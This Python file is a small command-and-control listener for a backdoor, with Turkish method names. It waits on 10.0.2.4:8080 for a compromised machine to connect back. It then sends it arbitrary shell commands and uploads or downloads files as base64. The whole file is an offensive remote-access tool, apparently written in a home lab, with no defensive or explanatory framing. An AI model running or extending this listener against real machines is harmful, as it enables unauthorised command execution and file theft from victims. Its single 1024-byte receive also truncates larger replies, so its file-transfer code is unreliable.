import socket as sc
import base64
from shlex import join

class Lintener:
    def __init__(self,ip,port):
        self.my_connection=sc.socket(sc.AF_INET,sc.SOCK_STREAM)
        self.my_connection.setsockopt(sc.SOL_SOCKET,sc.SO_REUSEADDR,1)
        self.my_connection.bind((ip,port))
        self.my_connection.listen(0)
        (self.connection,self.address)=self.my_connection.accept()

    def dosya_kaydet(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
        return "Download ok..."

    def dosya_gonder(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listen(self):
        print("Listening from "+str(self.address))
        while True:
            com_input=input("Enter command : ")
            l_input=com_input.split(" ")

            if l_input[0]=="exit":
                exit()
            if l_input[0]=="upload":
                file_con=self.dosya_gonder(l_input[1])
                file_con=file_con.decode()
                l_input.append(file_con)

            com_input=join(l_input)
            com_input=bytes(com_input,"utf-8")
            self.connection.send(com_input)

            veri=self.connection.recv(1024)
            veri=veri.decode()

            if l_input[0]=="download":
                veri=self.dosya_kaydet(l_input[1],veri.encode())

            print(veri)

listen=Lintener("10.0.2.4",8080)
listen.start_listen()